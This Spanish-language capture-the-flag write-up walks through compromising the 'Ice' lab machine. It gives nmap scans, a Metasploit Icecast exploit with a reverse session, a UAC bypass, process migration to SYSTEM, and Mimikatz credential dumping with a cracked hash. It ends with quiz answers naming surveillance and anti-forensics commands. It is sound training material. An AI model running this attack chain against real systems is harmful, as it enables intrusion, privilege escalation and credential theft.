# Ice

## nmap

Después de esperar unos minutos a que inicie la máquina, escaneamos los puertos.

```
nmap -A -T4 -p- 10.10.39.57
```

![[Pasted image 20250221122600.png]]

Y estos son los resultados del script:

![[Pasted image 20250221122646.png]]

El puerto 8000 es el de `Icecast` y el hostname es `DARK-PC`.

```
sudo nmap -sS 10.10.39.57
```

![[Pasted image 20250221123829.png]]

Verificamos si hay vulnerabilidades mediante el script de `nmap`. Tardará unos minutos en completarse.

```
nmap -T4 -A -p- --script=vuln 10.10.39.57 -vv
```

Se ha detectado una vulnerabilidad `ms17-010`cuyo CVE es `CVE-2017-0143` además de `CVE-2007-6750`-

![[Pasted image 20250221125732.png]]
![[Pasted image 20250221125321.png]]

Buscamos la vulnerabilidad de `Icecast` también.

https://www.cvedetails.com/cve/CVE-2004-1561/
## Obtener acceso

Abrimos la consola de metasploitable:

```
msfconsole
```

Buscamos el exploit de `Icecast`:

```
search icecast
```

Cargamos el exploit:

```
use 0
```

![[Pasted image 20250221130420.png]]

Configuramos las opciones.


```
set RHOST 10.10.39.57
set LHOST 10.8.3.33
```

![[Pasted image 20250221130610.png]]

Ejecutamos el exploit:

```
run
```

![[Pasted image 20250221130948.png]]

## Escalada de privilegios

Introducimos el siguiente comando para ver el server username:

```
getuid
```

![[Pasted image 20250221131452.png]]

Para ver la información del sistema:

```
sysinfo
```

![[Pasted image 20250221131546.png]]

Ahora que conocemos la arquitectura de los procesos, vamos a hacer un reconocimiento más avanzado de los mismos:

```
run post/multi/recon/local_exploit_suggester
```

![[Pasted image 20250221132008.png]]

Ponemos el proceso en el background:

```
background
```

Usamos el siguiente exploit:

```
use exploit/windows/local/bypassuac_eventvwr
```

![[Pasted image 20250221132232.png]]

Vemos las opciones y asignamos la sesión:

```
options
set session 2 
```

> Hay que asegurarse bien de qué sesión es con el comando `sessions`.

Iniciamos el exploit:

```
run
```

![[Pasted image 20250221132414.png]]

Ahora lo ejecutamos con una interfaz disntinta:

```
set LHOST tun0
```

Ejecutamos el siguiente comando una vez obtenemos acceso:

```
getprivs
```

![[Pasted image 20250221132709.png]]

El permiso de `SeTakeOwnershipPrivilege`es el que permite obtener la propiedad de una archivo.

## Looting

Visualizamos los procesos del sistema con el comando `ps`:

![[Pasted image 20250221133657.png]]

Migramos el proceso con el siguiente comando:

```
migrate -N spoolsv.exe
```

![[Pasted image 20250221133807.png]]

Confirmamos que ahora somos NT Authority.

```
getuid
```

![[Pasted image 20250221133907.png]]

Ahora que tenemos todos los permisos, vamos a usar el comando `kiwi`. Escribimos el comando `help` que muestra todas las funciones de la herramienta.

```
load kiwi
help
```

![[Pasted image 20250221134221.png]]

![[Pasted image 20250221134301.png]]

Para obtener todos los credenciales usaremos el siguiente comando:

```
creds_all
```

![[Pasted image 20250221134352.png]]

También podemos usar `hashdump`y crackear los hashes.

![[Pasted image 20250221134431.png]]

En la siguient página podemos crackearlos.

https://crackstation.net/

Este es el de Dark:

```
7c4fe5eada682714a036e39378362bab
```

![[Pasted image 20250221134641.png]]

La contraseña es `Password01!`.

## Post-Exploitation

- ¿Qué comando nos metire dumpear todas los hashes de las contraseñas del sistema?

**hashdump**


- ¿Qué comando nos permite ver el escritorio remoto del usuario en tiempo real?

**Screenshare**

- Si quisiéramos grabar desde un micrófono conectado al equipo, ¿qué comando nos lo permitiría?

**record_mic**

- Podemos modificar las marcas de tiempo de los archivos del sistema. ¿Qué comando nos permite hacerlo?

**timestomp**


- Mimikatz nos permite crear lo que se denomina un «ticket dorado», que nos permite autenticarnos en cualquier lugar con facilidad. ¿Qué comando nos permite hacer esto?

**golden_ticket_create**























